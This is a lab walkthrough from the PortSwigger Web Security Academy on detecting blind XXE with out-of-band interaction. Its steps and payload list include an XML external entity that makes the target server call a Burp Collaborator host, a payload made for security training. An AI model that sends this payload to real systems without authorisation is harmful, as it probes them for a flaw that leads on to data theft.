## Blind XXE with out-of-band interaction

**Category:** xxe
**Difficulty:** Unknown

### Description
This lab has a "Check stock" feature that parses XML input but does not display the result.

### Solution Steps
1. Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
2. Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated: <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
3. Replace the productId number with a reference to the external entity: &xxe;
4. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

### Key Payloads
- `stockCheck`
- `<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`
- `productId`
- `&xxe;`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: xxe

---
*Source: PortSwigger Web Security Academy*
